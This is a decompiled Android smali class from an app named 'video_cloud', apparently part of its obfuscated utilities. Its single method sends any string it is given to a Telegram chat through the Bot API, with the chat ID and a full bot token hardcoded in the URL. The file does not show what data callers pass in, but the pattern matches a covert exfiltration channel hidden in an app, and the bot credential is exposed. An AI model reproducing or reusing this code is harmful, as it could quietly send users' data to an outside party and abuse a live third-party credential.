.class public abstract Lcom/video_cloud/utils/u1;
.super Ljava/lang/Object;
.source "SourceFile"


# direct methods
.method public static a(Ljava/lang/String;)V
    .locals 3

    .line 1
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v1, "chat_id"

    const-string v2, "-1002900908370"

    invoke-interface {v0, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "text"

    invoke-interface {v0, v1, p0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    new-instance p0, Lcom/video_cloud/utils/u1$a;

    invoke-direct {p0}, Lcom/video_cloud/utils/u1$a;-><init>()V

    const-string v1, "https://api.telegram.org/bot7700482808:AAHXAtDw2Y4bKvMDA6EhbVffSKUW0lAxpF4/sendMessage"

    invoke-static {v1, v0, p0}, Lcom/video_cloud/utils/f1;->t(Ljava/lang/String;Ljava/util/Map;Lcom/video_cloud/utils/f1$h;)V

    return-void
.end method
